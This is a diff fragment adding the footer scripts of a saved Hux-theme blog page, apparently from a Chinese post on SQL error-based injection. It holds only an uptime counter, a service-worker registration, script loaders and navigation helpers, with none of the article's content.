+    <link rel="stylesheet" href="./SQL报错注入 - Von的博客 _ Von Blog_files/cb-search.css">
+
+    <script src="./SQL报错注入 - Von的博客 _ Von Blog_files/bootstrap3-typeahead.min.js.下載"></script>
+    <script src="./SQL报错注入 - Von的博客 _ Von Blog_files/cb-search.js.下載"></script>
+
+</footer>
+
+<script async="" src="./SQL报错注入 - Von的博客 _ Von Blog_files/busuanzi.pure.mini.js.下載"></script>
+
+<script>
+  
+  window.setInterval('counter()',1000);
+  function counter(){
+    var date=new Date();
+    var startDate=new Date(2019,5,19,0,0,0);
+    var time=(date-startDate)/1000;
+    var day=Math.floor(time/(24*60*60));
+    var hour=Math.floor(time%(24*60*60)/(60*60));
+    var minute=Math.floor(time%(24*60*60)%(60*60)/60);
+    var second=Math.floor(time%(24*60*60)%(60*60)%60);
+    var str="我的博客已默默运行了" + day + "天" + hour +"时" + minute + "分" + second + "秒";
+    document.getElementById('count').innerHTML=str;
+  }
+</script>
+
+<!-- jQuery -->
+<!--<script src="/js/jquery.min.js "></script>-->
+<!--<script src="//cdn.bootcss.com/jquery/2.2.2/jquery.min.js"></script>-->
+
+
+<!-- Bootstrap Core JavaScript -->
+<!--<script src="/js/bootstrap.min.js "></script>-->
+<!--<script src="//cdn.bootcss.com/bootstrap/3.3.6/js/bootstrap.min.js"></script>-->
+
+
+<!-- Custom Theme JavaScript -->
+<script src="./SQL报错注入 - Von的博客 _ Von Blog_files/hux-blog.min.js.下載"></script>
+
+<!-- Service Worker -->
+
+<script type="text/javascript">
+    if(navigator.serviceWorker){
+        // For security reasons, a service worker can only control the pages that are in the same directory level or below it. That's why we put sw.js at ROOT level.
+        navigator.serviceWorker
+            .register('/sw.js')
+            .then((registration) => {console.log('Service Worker Registered. ', registration)})
+            .catch((error) => {console.log('ServiceWorker registration failed: ', error)})
+    }
+</script>
+
+
+
+<!-- async load function -->
+<script>
+    function async(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+<!-- 
+     Because of the native support for backtick-style fenced code blocks 
+     right within the Markdown is landed in Github Pages, 
+     From V1.6, There is no need for Highlight.js, 
+     so Huxblog drops it officially.
+
+     - https://github.com/blog/2100-github-pages-now-faster-and-simpler-with-jekyll-3-0  
+     - https://help.github.com/articles/creating-and-highlighting-code-blocks/ 
+     - https://github.com/jneen/rouge/wiki/list-of-supported-languages-and-lexers   
+-->
+<!--
+    <script>
+        async("http://cdn.bootcss.com/highlight.js/8.6/highlight.min.js", function(){
+            hljs.initHighlightingOnLoad();
+        })
+    </script>
+    <link href="http://cdn.bootcss.com/highlight.js/8.6/styles/github.min.css" rel="stylesheet">
+-->
+
+
+<!-- jquery.tagcloud.js -->
+<script>
+    // only load tagcloud.js in tag.html
+    if($('#tag_cloud').length !== 0){
+        async('/js/jquery.tagcloud.js',function(){
+            $.fn.tagcloud.defaults = {
+                //size: {start: 1, end: 1, unit: 'em'},
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+<!--fastClick.js -->
+<script>
+    async("//cdnjs.cloudflare.com/ajax/libs/fastclick/1.0.6/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+<!-- Google Analytics -->
+
+
+
+<!-- Baidu Tongji -->
+
+
+
+
+<!-- Side Catalog -->
+
+<script type="text/javascript">
+    function generateCatalog (selector) {
+        var P = $('div.post-container'),a,n,t,l,i,c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#"+$(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="'+i+'" rel="nofollow">'+t+'</a>');
+            l = $('<li class="'+n+'_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;    
+    }
+
+    generateCatalog(".catalog-body");
+
+    // toggle side catalog
+    $(".catalog-toggle").click((function(e){
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    /*
+     * Doc: https://github.com/davist11/jQuery-One-Page-Nav
+     * Fork by Hux to support padding
+     */
+    async("/js/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+<!-- Image to hack wechat -->
+<img src="./SQL报错注入 - Von的博客 _ Von Blog_files/apple-touch-icon.png" width="0" height="0">
+<!-- Migrate from head to bottom, no longer block render and still work -->
+
+
+
+
+<iframe src="./SQL报错注入 - Von的博客 _ Von Blog_files/globalstorage.html" style="position: absolute; width: 1px; height: 1px; left: -9999px;"></iframe></body></html>
